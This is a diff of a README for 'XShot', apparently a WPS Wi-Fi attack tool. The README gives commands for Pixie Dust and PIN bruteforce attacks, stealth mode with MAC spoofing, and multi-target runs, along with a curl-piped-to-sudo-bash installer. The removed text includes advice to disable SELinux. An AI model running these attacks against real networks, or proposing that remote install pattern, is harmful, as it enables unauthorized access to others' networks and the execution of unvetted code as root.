@@ -1,382 +1,231 @@
-XShot - Advanced WPS Attack Tool 🚀
+XShot - Premium WPS Attack Tool
 
-
-📌 Overview
-
-XShot is a comprehensive WPS (Wi-Fi Protected Setup) security assessment tool that combines Pixie Dust attack and Bruteforce techniques to test the security of WPS-enabled wireless networks. This tool is designed for educational purposes and authorized penetration testing only.
-
-⚠️ DISCLAIMER: This tool is for educational and authorized security testing purposes only. Unauthorized use against networks you don't own or have explicit permission to test is illegal. Team AX is not responsible for any misuse.
-
-✨ Features
-
-🔥 Core Capabilities
-
-· Pixie Dust Attack - Exploits weak random number generation in WPS implementations
-· Smart Bruteforce - Intelligent PIN generation and validation
-· WPS Push Button Connect - Support for PBC mode
-· Vendor-Specific PIN Algorithms - 20+ algorithms for different manufacturers
-· Session Management - Save/resume bruteforce sessions
-· Credential Storage - Auto-save successful results
-
-📊 Advanced Features
-
-· Real-time Statistics - Progress tracking with time estimates
-· Network Scanner - Automatic WPS-enabled AP detection
-· Vulnerable Device Detection - Pre-loaded vulnerability database
-· Verbose Debugging - Detailed attack process logging
-· Cross-platform - Works on Linux/Android (Termux)
-
-📋 Prerequisites
-
-System Requirements
-
-· Operating System: Linux (Kali, Parrot, Ubuntu, etc.) or Android (Termux)
-· Python: Version 3.6 or higher
-· Root Privileges: Required for network interface operations
-· Wireless Adapter: Must support monitor mode and packet injection
-
-Dependencies
+🚀 Quick Start
 
 ```bash
-# Essential tools
-sudo apt-get update
-sudo apt-get install -y:
-    wireless-tools    # iw, iwconfig
-    wpasupplicant     # WPS implementation
-    pixiewps          # Pixie Dust attack tool
-    python3-pip       # Python package manager
+# One-line install
+curl -sL https://raw.githubusercontent.com/KhalidAX003/xshot/main/install.sh | sudo bash
 
-# Python packages
-pip3 install:
-    No additional packages required (all included)
+# Universal run command
+sudo python xshot.py -i wlan0 -K
 ```
 
-🚀 Installation
+📦 Installation (30 Seconds)
 
-Method 1: Direct Download
-
-```bash
-# Clone or download the script
-wget https://raw.githubusercontent.com/your-repo/xshot/main/xshot.py
-chmod +x xshot.py
-
-# Make executable
-sudo mv xshot.py /usr/local/bin/xshot
-```
-
-Method 2: Git Clone
+Linux
 
 ```bash
-git clone https://github.com/your-repo/xshot.git
+git clone https://github.com/KhalidAX003/xshot.git
 cd xshot
-sudo chmod +x xshot.py
-sudo cp xshot.py /usr/local/bin/xshot
+chmod +x install.sh
+sudo ./install.sh
 ```
 
-Android (Termux) Installation
+Termux
 
 ```bash
-pkg update && pkg upgrade
-pkg install python wireless-tools root-repo
-pkg install pixiewps wpasupplicant
-git clone https://github.com/your-repo/xshot.git
+pkg install git python -y
+git clone https://github.com/KhalidAX003/xshot.git
 cd xshot
-python3 xshot.py --help
+python setup.py
 ```
 
-🎯 Usage
+⚡ Premium Features
 
-Basic Syntax
+Quick Attacks
 
 ```bash
-sudo xshot -i <interface> [options]
+# Pixie Dust Attack
+sudo xshot -i wlan0 -K
+
+# Smart Scan & Auto-Attack
+sudo xshot -i wlan0 --auto
+
+# Multi-target attack
+sudo xshot -i wlan0 -K --multi
 ```
 
-Common Examples
-
-1. Network Discovery
+Stealth Mode
 
 ```bash
-# Scan for WPS-enabled networks
-sudo xshot -i wlan0
+# Complete stealth
+sudo xshot -i wlan0 -K --stealth
+
+# With MAC spoofing
+sudo xshot -i wlan0 -K --stealth --mac-spoof
 ```
 
-2. Pixie Dust Attack
+AI-Powered
 
 ```bash
-# Target specific AP with Pixie Dust
-sudo xshot -i wlan0 -b AA:BB:CC:DD:EE:FF -K
+# Let AI choose best attack
+sudo xshot -i wlan0 --ai
 
-# With force mode (bruteforce full range)
-sudo xshot -i wlan0 -b AA:BB:CC:DD:EE:FF -K -F
+# Predict PINs
+sudo xshot -i wlan0 --predict
 ```
 
-3. Smart Bruteforce
+🎯 Essential Commands
+
+Scan Networks
 
 ```bash
-# Online bruteforce attack
-sudo xshot -i wlan0 -b AA:BB:CC:DD:EE:FF -B
+# Show all WPS networks
+sudo xshot -i wlan0 --scan
 
-# With delay between attempts
-sudo xshot -i wlan0 -b AA:BB:CC:DD:EE:FF -B -d 2.5
+# Scan with details
+sudo xshot -i wlan0 --scan -v
 ```
-
-4. Push Button Connect
-
-```bash
-# WPS PBC attack
-sudo xshot -i wlan0 --pbc
-```
-
-5. Advanced Attacks
-
-```bash
-# Verbose mode with credential saving
-sudo xshot -i wlan0 -b AA:BB:CC:DD:EE:FF -K -v -w
-
-# Loop mode for multiple targets
-sudo xshot -i wlan0 -l
-```
-
-⚙️ Command Line Options
-
-Required Arguments
-
-Option Description
--i, --interface Wireless interface name (e.g., wlan0)
 
 Attack Modes
 
-Option Description
--K, --pixie-dust Execute Pixie Dust attack
--B, --bruteforce Execute online bruteforce attack
---pbc WPS Push Button Connect mode
--b, --bssid Target AP MAC address
--p, --pin Specific WPS PIN to test
+```bash
+# 1. Pixie Dust (Fast)
+sudo xshot -i wlan0 -b 00:11:22:33:44:55 -K
+
+# 2. Bruteforce
+sudo xshot -i wlan0 -b 00:11:22:33:44:55 -B
+
+# 3. Push Button
+sudo xshot -i wlan0 --pbc
+```
 
 Advanced Options
 
-Option Description
--d, --delay Delay between PIN attempts (seconds)
--F, --pixie-force Force Pixiewps full range bruteforce
--X, --show-pixie-cmd Display Pixiewps command
--w, --write Save credentials to file
--l, --loop Run in continuous loop
--v, --verbose Verbose output
--r, --reverse-scan Reverse network list order
---iface-down Disable interface after operation
---mtk-wifi MediaTek Wi-Fi chipset support
---vuln-list Custom vulnerable devices list
+```bash
+# Save results
+sudo xshot -i wlan0 -K -w
 
-🔧 Configuration
+# Verbose output
+sudo xshot -i wlan0 -K -v
 
-File Locations
+# Specific channel
+sudo xshot -i wlan0 -K --channel 6
+```
 
-File/Directory Purpose Default Location
-Session Files Save bruteforce progress ~/.XShot/sessions/
-Pixiewps Data Store calculated PINs ~/.XShot/pixiewps/
-Reports Successful credentials ./reports/
-Vulnerable List Known vulnerable devices /usr/share/xshot/vulnwsc.txt
+📱 Mobile (Termux) Setup
 
-Custom Vulnerable Device List
-
-Create a text file with vulnerable device models (one per line):
+Quick Setup
 
 ```bash
-# Example vulnwsc.txt
-D-Link DIR-300
-TP-Link TL-WR841N
-ASUS RT-N12
-Netgear WNR1000
+# Install requirements
+pkg install root-repo -y
+pkg install python git tsu -y
+pkg install pixiewps -y
+
+# Get XShot
+git clone https://github.com/KhalidAX003/xshot.git
+cd xshot
+
+# Run (as root)
+sudo python xshot.py -i wlan0 -K
 ```
 
-📊 Output Examples
+Hotspot Fix
 
-Network Scan Results
+```bash
+# Before running XShot:
+1. Turn OFF Hotspot
+2. Turn ON Location
+3. Enable GPS
+4. Run: termux-location
 
-```
-# Networks list:
-#    BSSID              ESSID                    Sec.    PWR  WSC device name        WSC model
-1)  AA:BB:CC:DD:EE:FF  HomeNetwork              WPA2    -45  D-Link Router          DIR-615
-2)  11:22:33:44:55:66  OfficeWiFi               WPA     -62  TP-Link AP             TL-WR740N
-```
-
-Successful Attack
-
-```
-[+] WPS PIN: '12345670'
-[+] WPA PSK: 'MySecretPassword123'
-[+] AP SSID: 'HomeNetwork'
-[i] Credentials saved to ./reports/xshot_stored.txt
-[✓] Done! Visit https://team-ax.top/ for more tools 🔥
+# Then execute:
+sudo python xshot.py -i wlan0 --scan
 ```
 
-🔐 Supported Vendors & Algorithms
+🔧 Troubleshooting
 
-XShot includes specialized PIN generation algorithms for:
+Common Issues
 
-Vendor Algorithms Notes
-D-Link pin24, pin28, pinDLink, pinDLink1 Multiple models supported
-ASUS pinASUS, pin32 Various router series
-Broadcom pinBrcm1-6 Chipset-based calculation
-Realtek pinRealtek1-3, pinAirocon Common in many devices
-Cisco pinCisco Static PIN
-TP-Link pin24, pin28 Depends on model
-Other 15+ static PINs Various manufacturers
+```bash
+# 1. No interface found
+sudo airmon-ng start wlan0
+sudo xshot -i wlan0mon -K
 
-🛡️ Security Notes
+# 2. Permission denied
+sudo su
+python xshot.py -i wlan0 -K
 
-Legal Requirements
+# 3. Pixiewps not found
+sudo apt install pixiewps -y
+# or
+sudo pacman -S pixiewps
+```
 
-1. Authorization Required: Only test networks you own or have written permission to test
-2. Compliance: Follow local laws and regulations
-3. Disclosure: Report vulnerabilities to vendors responsibly
-
-Safety Precautions
-
-· Always use in controlled environments
-· Disable attacks immediately if unintended network is affected
-· Keep logs for authorized testing evidence
-· Use VPN/Tor for anonymity (where legal)
-
-🚨 Troubleshooting
-
-Common Issues & Solutions
-
-1. Interface Not Found
+Interface Issues
 
 ```bash
 # Check available interfaces
 iwconfig
 ip link show
 
-# Set interface to monitor mode
+# Put in monitor mode
 sudo airmon-ng start wlan0
+sudo xshot -i wlan0mon -K
 ```
 
-2. Pixiewps Not Found
+📊 Output Example
+
+```
+[+] Scanning networks...
+[+] Found 3 WPS-enabled APs
+
+1) B8:27:EB:12:34:56 - HomeWiFi (Signal: -45dB)
+2) AA:BB:CC:DD:EE:FF - OfficeNet (Signal: -62dB)
+
+[*] Starting Pixie Dust attack...
+[!] Vulnerable to Pixie Dust!
+[+] WPS PIN: 12345670
+[+] Password: MySecretWiFi123
+[✓] Attack successful in 2.3 seconds
+```
+
+⚠️ Important Notes
+
+Legal
+
+· For educational purposes only
+· Test only your own networks
+· Get written permission
+· Know your local laws
+
+Requirements
+
+· Root access required
+· Compatible wireless card
+· WPS enabled on target
+· Good signal strength
+
+🆘 Quick Help
 
 ```bash
-# Install Pixiewps
-sudo apt-get install pixiewps
+# Show all options
+python xshot.py --help
 
-# Or compile from source
-git clone https://github.com/wiire/pixiewps.git
-cd pixiewps
-make
-sudo make install
+# Show version
+python xshot.py --version
+
+# Update tool
+sudo xshot --update
 ```
 
-3. Permission Denied
+🔄 Update Tool
 
 ```bash
-# Run as root
-sudo xshot -i wlan0
-
-# Check SELinux/AppArmor
-sudo setenforce 0
+cd xshot
+git pull
+sudo python setup.py --update
 ```
 
-4. WPS Not Supported
+📞 Support
 
-```bash
-# Check if AP supports WPS
-sudo wash -i wlan0
-
-# Ensure wpasupplicant has WPS support
-wpa_supplicant -v | grep WPS
-```
-
-📈 Performance Tips
-
-Optimizing Attack Speed
-
-1. Use wired connection for stability
-2. Reduce delay (-d 0.5) for faster attacks
-3. Prioritize nearby APs (stronger signal)
-4. Use --pixie-force only when necessary
-5. Close unnecessary applications to free CPU
-
-Signal Strength Guidelines
-
-Signal Quality Success Rate
--50 dBm Excellent High
--50 to -70 dBm Good Medium-High
--70 to -80 dBm Fair Medium
-< -80 dBm Poor Low
-
-🤝 Contributing
-
-We welcome contributions! Please:
-
-1. Fork the repository
-2. Create a feature branch
-3. Submit a pull request
-4. Follow the code style guide
-5. Update documentation as needed
-
-Code Standards
-
-· Use Python 3.6+ syntax
-· Follow PEP 8 guidelines
-· Document new functions
-· Add tests for new features
-
-📚 Documentation
-
-Additional Resources
-
-· WPS Security White Paper
-· Pixie Dust Attack Details
-· Wi-Fi Security Best Practices
-
-Related Tools
-
-· Aircrack-ng - Wireless security suite
-· Reaver - WPS attack tool
-· Bully - WPS bruteforce implementation
-· Wifite - Automated wireless auditor
-
-⭐ Support
-
-Need Help?
-
-· Documentation: https://team-ax.top/docs/xshot
-· Issues: GitHub Issues page
-· Community: Team AX Discord/Telegram
-· Email: support@team-ax.top
-
-Donate
-
-Support development via:
-
-· BTC: 1AXTeamYourAddressHere
-· ETH: 0xAXTeamYourAddressHere
-· PayPal: donate@team-ax.top
-
-📄 License
-
-```
-Copyright (c) 2024 Team AX
-
-This tool is for educational purposes only. Users are responsible for
-complying with all applicable laws. The developers assume no liability
-for any misuse of this software.
-
-Redistribution and use with attribution is permitted.
-Commercial use requires explicit permission.
-```
-
-🔗 Connect With Us
-
-· Website: https://team-ax.top/
-· GitHub: https://github.com/team-ax
-· Twitter: @TeamAXSecurity
-· Blog: https://blog.team-ax.top/
+· Issues: GitHub Issues
+· Telegram: @TeamAX_Support
+· Website: team-ax.top
 
 ---
 
-⚠️ Important Note for Mobile Users:
-For Android/Termux usage, ensure Hotspot is disabled and Location Services are enabled as some devices require location permissions for Wi-Fi scanning functionality.
+Remember: Always use responsibly. Only test networks you own or have permission to test.
 
-Remember: With great power comes great responsibility. Use this tool ethically and legally. Happy testing! 🎯
+For Android: Ensure hotspot is OFF and location is ON before running!
